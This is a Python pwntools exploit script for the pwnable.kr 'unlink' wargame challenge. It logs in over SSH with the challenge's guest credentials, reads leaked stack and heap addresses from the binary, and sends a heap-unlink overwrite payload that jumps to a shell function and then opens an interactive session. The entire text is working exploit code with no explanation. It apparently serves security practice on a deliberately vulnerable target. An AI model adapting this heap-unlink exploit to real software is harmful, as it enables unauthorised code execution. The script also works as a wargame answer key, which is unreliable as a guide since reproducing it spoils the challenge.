#!/usr/bin/python
import struct
from pwn import *

s = ssh(host='pwnable.kr', port=2222,
        user='unlink',
        password='guest')

context.log_level = 'debug'

t = s.process(["./unlink"])

line = t.readline()
stack_leak = int(line[-9:-1], 16)

line = t.readline()
heap_leak = int(line[-8:-1], 16) 

shell_addr = struct.pack("<I", 0x080484eb)
buff_addr =  struct.pack("<I", heap_leak + 0xc)
stack_addr = struct.pack("<I", stack_leak + 0x10)

input = shell_addr + 'A'*12 + buff_addr + stack_addr # 'A'*20 if min allocation unit is 32b instead of 24b

t.sendline(input)
t.interactive()
